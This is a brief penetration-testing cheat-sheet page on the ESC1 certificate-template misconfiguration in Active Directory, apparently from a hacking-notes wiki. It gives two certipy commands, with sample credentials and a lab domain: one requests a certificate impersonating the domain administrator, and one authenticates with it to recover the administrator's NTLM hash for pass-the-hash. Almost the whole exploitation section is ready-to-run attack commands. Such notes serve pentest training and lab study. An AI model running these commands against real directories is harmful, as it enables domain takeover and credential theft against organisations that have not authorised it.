# ESC1

## <mark style="color:yellow;">ABOUT</mark>

<mark style="color:red;">**ESC1**</mark> (from ESCalate) <mark style="color:purple;">**allows any domain user**</mark> <mark style="color:purple;">**to impersonate**</mark> (become) a Domain Admin or any other user by requesting a certificate "as them" and logging in using that certificate.

## <mark style="color:yellow;">EXPLOITATION</mark>

### <mark style="color:blue;">Request Cert as Admin</mark>

```bash
certipy req -u 'Solomon.Reed@militech.local' -p 'SuperAgent12' -dc-ip 13.13.13.13 -target 13.13.13.13 -ca militech-DC-CA -template UserAuthentication -upn administrator@militech.local -debug
```

### <mark style="color:blue;">**Auth as Admin**</mark>

```bash
certipy auth -pfx administrator.pfx -dc-ip 13.13.13.13
```

In the result we would have administrator's NTLM hash we could use for PTH.

## <mark style="color:yellow;">RESOURCES</mark>

{% embed url="https://www.hackingarticles.in/ad-certificate-exploitation-esc1/" %}
